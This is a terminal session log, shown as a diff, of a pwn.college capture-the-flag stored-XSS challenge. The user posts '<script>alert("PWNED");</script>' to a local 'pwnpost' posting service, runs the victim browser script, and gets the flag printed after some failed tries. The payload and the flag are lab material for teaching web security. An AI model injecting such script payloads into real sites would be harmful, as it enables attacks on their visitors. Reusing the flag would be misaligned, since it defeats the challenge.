@@ -1,0 +1,104 @@
+hacker@web-security~xss-2:/challenge$ python 
+Python 3.12.11 (main, Jun  3 2025, 15:41:47) [GCC 14.2.1 20250322] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import requests
+>>> session = requests.Session()
+>>> resp = session.post("http://challenge.localhost:80", data={"content": '<script>alert("PWNED");</script>'})
+127.0.0.1 - - [24/Oct/2025 21:22:07] "POST / HTTP/1.1" 302 -
+127.0.0.1 - - [24/Oct/2025 21:22:07] "GET / HTTP/1.1" 200 -
+>>> resp = session.post("http://challenge.localhost:80", data={"content": '<script>alert("PWNED");</script>'}).text
+127.0.0.1 - - [24/Oct/2025 21:22:12] "POST / HTTP/1.1" 302 -
+127.0.0.1 - - [24/Oct/2025 21:22:12] "GET / HTTP/1.1" 200 -
+>>> os.system(victim)
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+NameError: name 'os' is not defined. Did you forget to import 'os'?
+>>> import os
+>>> os.system('victim')
+sh: 1: victim: Permission denied
+32512
+>>> os.system(victim)
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+NameError: name 'victim' is not defined
+>>> os.system('victim')
+sh: 1: victim: Permission denied
+32512
+>>> os.system('ls -al')
+total 20
+drwxr-xr-x 1 root root 4096 Oct 24 15:26 .
+drwxr-xr-x 1 root root 4096 Oct 24 15:26 ..
+-rwsr-xr-x 1 root root 1769 Feb  6  2025 DESCRIPTION.md
+-rwsr-xr-x 1 root root 1412 Sep  6 06:48 server
+-rwsr-xr-x 1 root root 1424 Sep  6 06:48 victim
+0
+>>> resp = session.post("http://challenge.localhost:80", data={"content": '<script>alert("PWNED");</script>'}).text
+127.0.0.1 - - [24/Oct/2025 21:23:17] "POST / HTTP/1.1" 302 -
+127.0.0.1 - - [24/Oct/2025 21:23:17] "GET / HTTP/1.1" 200 -
+>>> session.post("http://challenge.localhost:80", data={"content": '<script>alert("PWNED");</script>'}).text
+127.0.0.1 - - [24/Oct/2025 21:23:36] "POST / HTTP/1.1" 302 -
+127.0.0.1 - - [24/Oct/2025 21:23:36] "GET / HTTP/1.1" 200 -
+'<html><body>\nWelcome to pwnpost, the anonymous posting service. Post away!\n<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>\n<hr>First Post!\n<hr><script>alert("PWNED");</script>\n<hr><script>alert("PWNED");</script>\n<hr><script>alert("PWNED");</script>\n<hr><script>alert("PWNED");</script>\n</body></html>'
+>>> os.system('ls -al')
+total 20
+drwxr-xr-x 1 root root 4096 Oct 24 15:26 .
+drwxr-xr-x 1 root root 4096 Oct 24 15:26 ..
+-rwsr-xr-x 1 root root 1769 Feb  6  2025 DESCRIPTION.md
+-rwsr-xr-x 1 root root 1412 Sep  6 06:48 server
+-rwsr-xr-x 1 root root 1424 Sep  6 06:48 victim
+0
+>>> os.system('victim')
+sh: 1: victim: Permission denied
+32512
+>>> os.system('./victim')
+
+^CTraceback (most recent call last):
+  File "./victim", line 25, in <module>
+    browser = webdriver.Firefox(service=service, options=options)
+  File "/usr/local/lib/python3.8/dist-packages/selenium/webdriver/firefox/webdriver.py", line 57, in __init__
+    if finder.get_browser_path():
+  File "/usr/local/lib/python3.8/dist-packages/selenium/webdriver/common/driver_finder.py", line 47, in get_browser_path
+    return self._binary_paths()["browser_path"]
+  File "/usr/local/lib/python3.8/dist-packages/selenium/webdriver/common/driver_finder.py", line 67, in _binary_paths
+    output = SeleniumManager().binary_paths(self._to_args())
+  File "/usr/local/lib/python3.8/dist-packages/selenium/webdriver/common/selenium_manager.py", line 55, in binary_paths
+    return self._run(args)
+  File "/usr/local/lib/python3.8/dist-packages/selenium/webdriver/common/selenium_manager.py", line 119, in _run
+    completed_proc = subprocess.run(args, capture_output=True)
+  File "/usr/lib/python3.8/subprocess.py", line 495, in run
+    stdout, stderr = process.communicate(input, timeout=timeout)
+  File "/usr/lib/python3.8/subprocess.py", line 1028, in communicate
+    stdout, stderr = self._communicate(input, endtime, timeout)
+  File "/usr/lib/python3.8/subprocess.py", line 1868, in _communicate
+    ready = selector.select(timeout)
+  File "/usr/lib/python3.8/selectors.py", line 415, in select
+    fd_event_list = self._selector.poll(timeout)
+KeyboardInterrupt
+2
+>>> os.system('bash victim')
+victim: line 3: import: command not found
+victim: line 4: import: command not found
+victim: line 5: import: command not found
+victim: line 6: import: command not found
+victim: line 7: import: command not found
+victim: line 8: import: command not found
+from: too many arguments
+from: too many arguments
+from: too many arguments
+from: too many arguments
+from: too many arguments
+from: too many arguments
+from: too many arguments
+victim: line 18: syntax error near unexpected token `os.geteuid'
+victim: line 18: `os.setuid(os.geteuid())'
+512
+>>> 
+[2]+  Stopped                 python
+hacker@web-security~xss-2:/challenge$ ./victim 
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Visiting http://challenge.localhost:80/
+127.0.0.1 - - [24/Oct/2025 21:24:31] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [24/Oct/2025 21:24:32] "GET /favicon.ico HTTP/1.1" 404 -
+Alert triggered! Your reward:
+pwn.college{k6SPg7DpyXhNsS3-Tx_jFK4XgSY.ddzN1YDL1AjM5MzW}
